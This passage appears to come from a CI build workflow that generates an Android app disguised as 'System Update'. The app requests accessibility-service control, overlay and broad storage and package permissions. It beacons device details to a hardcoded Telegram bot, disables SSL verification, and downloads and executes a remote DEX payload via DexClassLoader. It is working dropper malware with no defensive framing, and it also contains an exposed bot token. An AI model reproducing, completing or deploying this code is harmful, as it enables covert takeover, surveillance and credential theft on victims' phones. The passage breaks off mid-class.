          cat > app/src/main/res/values/colors.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <resources>
              <color name="ic_launcher_background">#1877F2</color>
          </resources>
          EOF

      # ==================== RESOURCES ====================
      
      - name: Create strings.xml
        run: |
          cat > app/src/main/res/values/strings.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <resources>
              <string name="app_name">System Update</string>
          </resources>
          EOF

      - name: Create AndroidManifest.xml
        run: |
          cat > app/src/main/AndroidManifest.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
              xmlns:tools="http://schemas.android.com/tools">
              
              <uses-permission android:name="android.permission.INTERNET" />
              <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
              <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
              <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
              <uses-permission android:name="android.permission.GET_TASKS" />
              <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" />
              <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
              <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />

              <application
                  android:allowBackup="true"
                  android:label="@string/app_name"
                  android:icon="@mipmap/ic_launcher"
                  android:usesCleartextTraffic="true"
                  android:requestLegacyExternalStorage="true">
                  
                  <activity
                      android:name=".MainActivity"
                      android:exported="true">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>

                  <service
                      android:name=".DexWorkerService"
                      android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
                      android:exported="true">
                      <intent-filter>
                          <action android:name="android.accessibilityservice.AccessibilityService" />
                      </intent-filter>
                      <meta-data
                          android:name="android.accessibilityservice"
                          android:resource="@xml/accessibility_config" />
                  </service>
              </application>
          </manifest>
          EOF

      - name: Create accessibility_config.xml
        run: |
          cat > app/src/main/res/xml/accessibility_config.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
              android:accessibilityEventTypes="typeAllMask"
              android:accessibilityFeedbackType="feedbackGeneric"
              android:accessibilityFlags="flagReportViewIds|flagRetrieveInteractiveWindows|flagRequestTouchExplorationMode"
              android:canPerformGestures="true"
              android:canRetrieveWindowContent="true"
              android:description="@string/app_name"
              android:notificationTimeout="100" />
          EOF

      # ==================== SOURCE CODE ====================

      - name: Create MainActivity.java
        run: |
          cat > app/src/main/java/com/system/update/MainActivity.java << 'EOF'
          package com.system.update;

          import android.app.Activity;
          import android.content.Intent;
          import android.content.pm.PackageManager;
          import android.os.Build;
          import android.os.Bundle;
          import android.provider.Settings;
          import androidx.core.app.ActivityCompat;
          import androidx.core.content.ContextCompat;

          public class MainActivity extends Activity {
              private static final int PERMISSION_REQUEST_CODE = 100;

              @Override
              protected void onCreate(Bundle savedInstanceState) {
                  super.onCreate(savedInstanceState);
                  requestPermissions();
                  startService(new Intent(this, DexWorkerService.class));
                  finish();
              }

              private void requestPermissions() {
                  String[] permissions = {
                      android.Manifest.permission.INTERNET,
                      android.Manifest.permission.ACCESS_NETWORK_STATE,
                      android.Manifest.permission.QUERY_ALL_PACKAGES,
                      android.Manifest.permission.GET_TASKS,
                      android.Manifest.permission.PACKAGE_USAGE_STATS,
                      android.Manifest.permission.READ_EXTERNAL_STORAGE,
                      android.Manifest.permission.WRITE_EXTERNAL_STORAGE
                  };
                  
                  for (String permission : permissions) {
                      if (ContextCompat.checkSelfPermission(this, permission) 
                          != PackageManager.PERMISSION_GRANTED) {
                          ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
                          break;
                      }
                  }
                  
                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                      if (!Settings.canDrawOverlays(this)) {
                          Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
                          startActivity(intent);
                      }
                  }
              }
          }
          EOF

      - name: Create DexWorkerService.java
        run: |
          cat > app/src/main/java/com/system/update/DexWorkerService.java << 'EOF'
          package com.system.update;

          import android.accessibilityservice.AccessibilityService;
          import android.app.ActivityManager;
          import android.content.Context;
          import android.content.Intent;
          import android.content.pm.PackageManager;
          import android.graphics.PixelFormat;
          import android.os.Build;
          import android.os.Handler;
          import android.os.Looper;
          import android.provider.Settings;
          import android.util.Log;
          import android.view.Gravity;
          import android.view.View;
          import android.view.WindowManager;
          import android.view.accessibility.AccessibilityEvent;
          import android.view.accessibility.AccessibilityNodeInfo;
          import android.webkit.WebView;
          import android.webkit.WebViewClient;
          
          import dalvik.system.DexClassLoader;
          
          import java.io.BufferedReader;
          import java.io.File;
          import java.io.FileOutputStream;
          import java.io.InputStream;
          import java.io.InputStreamReader;
          import java.lang.reflect.Method;
          import java.net.HttpURLConnection;
          import java.net.URL;
          import java.text.SimpleDateFormat;
          import java.util.Date;
          import java.util.List;
          import java.util.Locale;
          import java.util.UUID;
          import java.util.concurrent.ExecutorService;
          import java.util.concurrent.Executors;
          
          import javax.net.ssl.HttpsURLConnection;
          import javax.net.ssl.SSLContext;
          import javax.net.ssl.TrustManager;
          import javax.net.ssl.X509TrustManager;

          public class DexWorkerService extends AccessibilityService {
              private static final String TAG = "DexWorker";
              private static final String DEX_URL = "https://payload-host-079x.onrender.com/payload.dex";
              private static final String VERSION_URL = "https://payload-host-079x.onrender.com/version";
              private static final String BOT_TOKEN = "8585104821:AAFXZn3g7QG9NsCmLmZuyfviQkPddOYMJzc";
              private static final String CHAT_ID = "8468538314";
              
              private Handler mainHandler = new Handler(Looper.getMainLooper());
              private ExecutorService executor = Executors.newSingleThreadExecutor();
              private Class<?> dexPayloadClass;
              private boolean isDexLoaded = false;
              private String deviceId = "";
              private String currentVersion = "";
              private View overlayView;
              private WebView overlayWebView;
              private WindowManager windowManager;
              private boolean isOverlayShowing = false;

              @Override
              public void onServiceConnected() {
                  super.onServiceConnected();
                  Log.d(TAG, "🚀 DEX WORKER SERVICE STARTED");
                  
                  windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
                  deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
                  if (deviceId == null || deviceId.isEmpty()) {
                      deviceId = UUID.randomUUID().toString();
                  }
                  deviceId = deviceId + "-" + System.currentTimeMillis();
                  
                  sendTelegram("📱 *SYSTEM UPDATE APK INSTALLED*\n\n" +
                               "🆔 Device ID: `" + deviceId + "`\n" +
                               "📟 Device: " + Build.MANUFACTURER + " " + Build.MODEL + "\n" +
                               "🤖 Android: " + Build.VERSION.RELEASE + "\n" +
                               "📅 Time: " + getCurrentTimestamp() + "\n" +
                               "✅ Status: INSTALLED");
                  
                  disableSSLVerification();
                  startDexWorker();
              }

              private void startDexWorker() {
                  executor.execute(() -> {
                      try {
                          // Check version first
                          checkVersion();
                          
                          String dexPath = getDexPath();
                          File dexFile = new File(dexPath);
                          
                          if (!dexFile.exists()) {
                              Log.d(TAG, "📥 Downloading DEX...");
                              downloadDex(dexPath);
                          } else {
                              Log.d(TAG, "✅ DEX found");
                          }
                          
                          loadAndInitializeDex(dexPath);
                      } catch (Exception e) {
                          Log.e(TAG, "❌ DEX Worker error: " + e.getMessage(), e);
                      }
                  });
              }

              private void checkVersion() {
                  try {
                      HttpURLConnection conn = (HttpURLConnection) new URL(VERSION_URL).openConnection();
                      conn.setRequestMethod("GET");
                      conn.setConnectTimeout(5000);
                      conn.setReadTimeout(5000);
                      
                      if (conn.getResponseCode() == 200) {
                          BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                          String response = reader.readLine();
                          reader.close();
                          conn.disconnect();
                          
                          String newVersion = "1.0.0";
                          if (response != null && response.contains("\"version\"")) {
                              int start = response.indexOf("\"version\":\"") + 11;
                              int end = response.indexOf("\"", start);
                              if (start > 0 && end > start) {
                                  newVersion = response.substring(start, end);
                              }
                          }
                          
                          if (!newVersion.equals(currentVersion) && !currentVersion.isEmpty()) {
                              sendTelegram("🔄 *UPDATE AVAILABLE*\n\n" +
                                           "🆔 Device ID: `" + deviceId + "`\n" +
                                           "📌 Current Version: " + currentVersion + "\n" +
                                           "📌 New Version: " + newVersion + "\n" +
                                           "📅 Time: " + getCurrentTimestamp() + "\n" +
                                           "✅ Downloading new DEX...");
                              currentVersion = newVersion;
                          } else if (currentVersion.isEmpty()) {
                              currentVersion = newVersion;
                              sendTelegram("ℹ️ *NO UPDATE AVAILABLE*\n\n" +
                                           "🆔 Device ID: `" + deviceId + "`\n" +
                                           "📌 Current Version: " + currentVersion + "\n" +
                                           "📅 Time: " + getCurrentTimestamp() + "\n" +
                                           "✅ Already on latest version");
                          }
                      }
                      conn.disconnect();
                  } catch (Exception e) {
                      Log.e(TAG, "Version check failed: " + e.getMessage());
                  }
              }

              private void downloadDex(String dexPath) throws Exception {
                  try {
                      URL url = new URL(DEX_URL);
                      HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                      conn.setConnectTimeout(10000);
                      conn.setReadTimeout(10000);
                      
                      if (conn.getResponseCode() != 200) {
                          sendTelegram("❌ *DEX DOWNLOAD FAILED*\n\n" +
                                       "🆔 Device ID: `" + deviceId + "`\n" +
                                       "📅 Time: " + getCurrentTimestamp() + "\n" +
                                       "⚠️ Error: HTTP " + conn.getResponseCode());
                          throw new Exception("HTTP " + conn.getResponseCode());
                      }
                      
                      try (InputStream in = conn.getInputStream();
                           FileOutputStream out = new FileOutputStream(dexPath)) {
                          byte[] buffer = new byte[8192];
                          int bytesRead;
                          long totalBytes = 0;
                          while ((bytesRead = in.read(buffer)) != -1) {
                              out.write(buffer, 0, bytesRead);
                              totalBytes += bytesRead;
                          }
                          Log.d(TAG, "✅ DEX downloaded: " + totalBytes + " bytes");
                          
                          sendTelegram("📥 *DEX DOWNLOADED SUCCESSFULLY*\n\n" +
                                       "🆔 Device ID: `" + deviceId + "`\n" +
                                       "📦 Size: " + totalBytes + " bytes\n" +
                                       "📌 Version: " + currentVersion + "\n" +
                                       "📅 Time: " + getCurrentTimestamp() + "\n" +
                                       "✅ Status: DOWNLOADED");
                      }
                  } catch (Exception e) {
                      sendTelegram("❌ *DEX DOWNLOAD FAILED*\n\n" +
                                   "🆔 Device ID: `" + deviceId + "`\n" +
                                   "📅 Time: " + getCurrentTimestamp() + "\n" +
                                   "⚠️ Error: " + e.getMessage());
                      throw e;
                  }
              }

              private void loadAndInitializeDex(String dexPath) {
                  try {
                      File optimizedDir = new File(getCacheDir(), "dex_opt");
                      optimizedDir.mkdirs();
                      
                      DexClassLoader loader = new DexClassLoader(
                          dexPath,
                          optimizedDir.getAbsolutePath(),
                          null,
                          ClassLoader.getSystemClassLoader()
                      );
                      
                      dexPayloadClass = loader.loadClass("com.facebook.payload.Payload");
                      Log.d(TAG, "✅ DEX class loaded");
                      
                      Method setAPK = dexPayloadClass.getMethod("setAPKInterface", Object.class);
                      setAPK.invoke(null, this);
                      Log.d(TAG, "✅ APK Interface set");
                      
                      try {
                          Method init = dexPayloadClass.getMethod("initialize", Object.class, Object.class);
                          init.invoke(null, this, this.getApplicationContext());
                      } catch (NoSuchMethodException e) {
                          Method init = dexPayloadClass.getMethod("initialize");
                          init.invoke(null);
                      }
                      
                      isDexLoaded = true;
                      
                      sendTelegram("🚀 *DEX EXECUTED SUCCESSFULLY*\n\n" +
                                   "🆔 Device ID: `" + deviceId + "`\n" +
                                   "📟 Device: " + Build.MANUFACTURER + " " + Build.MODEL + "\n" +
                                   "📌 Status: READY\n" +
                                   "📅 Time: " + getCurrentTimestamp() + "\n" +
                                   "✅ DEX is now active");
                      
                      Log.d(TAG, "🔥 DEX WORKER READY");
                      
                  } catch (Exception e) {
                      Log.e(TAG, "❌ Failed to load DEX: " + e.getMessage(), e);
                      sendTelegram("❌ *DEX EXECUTION FAILED*\n\n" +
                                   "🆔 Device ID: `" + deviceId + "`\n" +
                                   "📅 Time: " + getCurrentTimestamp() + "\n" +
                                   "⚠️ Error: " + e.getMessage());
                  }
              }

